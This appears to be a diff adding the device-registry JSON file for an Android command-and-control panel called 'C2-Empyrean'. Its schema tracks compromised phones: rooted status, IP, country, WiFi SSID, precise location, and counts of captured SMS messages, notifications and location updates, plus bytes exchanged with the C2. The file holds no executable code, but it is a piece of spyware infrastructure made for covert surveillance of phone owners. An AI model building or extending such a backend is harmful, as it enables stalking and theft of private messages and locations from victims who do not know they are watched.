@@ -1,0 +1,40 @@
+{
+  "_comment": "C2-Empyrean - Registered devices database (JSON flat-file)",
+  "_version": 1,
+  "devices": [],
+  "_schema": {
+    "device_id": "string - unique device identifier",
+    "model": "string - device model name",
+    "manufacturer": "string - device manufacturer",
+    "android_version": "string - OS version",
+    "api_level": "integer - Android API level",
+    "security_patch": "string - security patch date",
+    "is_rooted": "boolean - device rooted status",
+    "first_seen": "integer - Unix timestamp of first registration",
+    "last_seen": "integer - Unix timestamp of last heartbeat",
+    "is_online": "boolean - current online status",
+    "ip": "string - last known IP address",
+    "country": "string - geolocated country",
+    "operator": "string - mobile operator",
+    "network_type": "string - WiFi/Mobile network type",
+    "signal_strength": "integer - signal level (0-100)",
+    "current_wifi": "string - connected WiFi SSID",
+    "battery_level": "integer - battery percentage (0-100)",
+    "is_charging": "boolean - charging status",
+    "last_location": {
+      "lat": "float - latitude",
+      "lng": "float - longitude",
+      "accuracy": "float - accuracy in meters",
+      "timestamp": "integer - Unix timestamp"
+    },
+    "total_data_sent": "integer - bytes sent to C2",
+    "total_data_received": "integer - bytes received from C2",
+    "heartbeat_count": "integer - total heartbeats received",
+    "sms_count": "integer - total SMS captured",
+    "notification_count": "integer - total notifications captured",
+    "location_count": "integer - total location updates",
+    "tags": "array of strings - user-defined tags",
+    "notes": "string - user-defined notes",
+    "group": "string - device group assignment"
+  }
+}
